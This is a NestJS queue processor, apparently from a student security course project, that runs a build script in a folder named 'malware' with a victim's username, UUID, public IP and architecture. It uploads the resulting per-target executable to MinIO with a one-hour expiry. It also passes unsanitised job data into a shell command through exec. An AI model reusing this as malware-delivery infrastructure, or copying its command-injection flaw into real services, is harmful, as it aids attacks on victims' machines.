import { Job } from 'bull';
import {
  OnQueueActive,
  OnQueueCompleted,
  Process,
  Processor,
} from '@nestjs/bull';
import { MachineInfo } from './machine.interface';
import { join, basename } from 'node:path';
import { exec } from 'child_process';
import { Inject, Logger } from '@nestjs/common';
import { MINIO_CONNECTION } from 'nestjs-minio';

@Processor('build')
export class BuildConsumer {
  private readonly logger = new Logger(BuildConsumer.name);

  constructor(@Inject(MINIO_CONNECTION) private readonly minioClient) {}
  @Process('build-job')
  async handleBuild(job: Job) {
    const { machineData } = job.data as { machineData: MachineInfo };

    const isWin = process.platform === 'win32';

    const scriptName = isWin ? 'build.bat' : 'build.sh';

    const scriptRoot =
      'C:\\Users\\Dorian\\Documents\\dev\\T-SEC-901-LYO_13\\malware\\test';

    const archMapper = {
      x64: 'amd64',
      x86: '386',
    };

    const scriptArgs = [
      machineData.username,
      machineData.uuid,
      machineData.publicIp,
      archMapper[machineData.arch],
    ];

    this.logger.debug(scriptArgs);

    const scriptPath = join(scriptRoot, scriptName);

    this.logger.debug(
      `Running script ${scriptPath} with args ${scriptArgs}...`,
    );

    const command = `${scriptPath} ${scriptArgs.join(' ')}`;

    const result: string = await new Promise((resolve, reject) => {
      exec(command, async (error, stdout, stderr) => {
        if (error) {
          this.logger.error(`Error: ${error}`);
          return reject(error);
        }

        if (stderr) {
          this.logger.error(`stderr: ${stderr}`);
          return reject(error);
        }

        const generatedExe = stdout.replace('\n', '');
        const generatedExePath = join(scriptRoot, generatedExe);

        this.logger.debug(
          `Generated exe: ${generatedExe} at ${generatedExePath}`,
        );
        resolve(generatedExePath);
      });
    });

    const file = result.replace('\r', '');
    const timestamp = Math.round(new Date().getTime() / 1000) + 3600; // 1 hour

    const metaData = {
      'Content-Type': 'application/octet-stream',
      'End-Of-Validity': new Date(timestamp * 1000).toISOString(),
    };

    this.logger.debug(`Uploading file ${basename(file)} to minio...`);

    this.minioClient.fPutObject(
      'core',
      basename(file),
      file,
      metaData,
      function (err, etag) {
        if (err) {
          return console.log(err);
        }
        console.log('File uploaded successfully.');
      },
    );
  }

  @OnQueueActive()
  onActive(job: Job) {
    this.logger.debug(
      `Processing job ${job.id} of type ${job.name} with data ${job.data}...`,
    );
  }
}
